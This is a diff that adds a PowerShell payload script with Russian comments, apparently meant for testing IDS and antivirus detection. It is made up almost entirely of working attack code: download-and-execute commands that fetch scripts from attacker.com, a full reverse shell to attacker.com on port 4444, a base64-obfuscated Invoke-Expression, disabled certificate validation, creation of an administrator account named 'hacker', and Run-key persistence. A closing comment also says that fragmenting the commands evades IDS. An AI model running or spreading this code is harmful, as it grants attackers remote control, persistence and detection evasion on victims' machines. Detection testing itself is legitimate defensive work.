@@ -1,0 +1,40 @@
+# PowerShell пейлоад для тестирования на Windows системах
+# Этот скрипт содержит сигнатуры, которые обычно обнаруживаются системами защиты
+
+# Загрузка и выполнение скрипта через PowerShell
+Invoke-WebRequest -Uri "http://attacker.com/malicious.ps1" -OutFile "$env:TEMP\payload.ps1"
+& "$env:TEMP\payload.ps1"
+
+# Альтернативный способ через IEX (Invoke-Expression)
+IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/malicious.ps1")
+
+# Создание обратного соединения через PowerShell
+$client = New-Object System.Net.Sockets.TCPClient("attacker.com", 4444)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2>&1 | Out-String )
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+
+# Выполнение команды через base64 (обфускация)
+$encoded = "SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2F0dGFja2VyLmNvbS9wYXlsb2FkLnBzMQ=="
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)) | Invoke-Expression
+
+# Загрузка через .NET классы
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+$web = New-Object System.Net.WebClient
+$web.DownloadString("http://attacker.com/payload.ps1") | Invoke-Expression
+
+# Дополнительные команды для тестирования обнаружения
+net user hacker Password123 /add
+net localgroup administrators hacker /add
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Payload" /t REG_SZ /d "$env:TEMP\payload.ps1" /f
+
+# Конец пейлоада
+# При фрагментации эти команды разбиваются на части и не обнаруживаются IDS
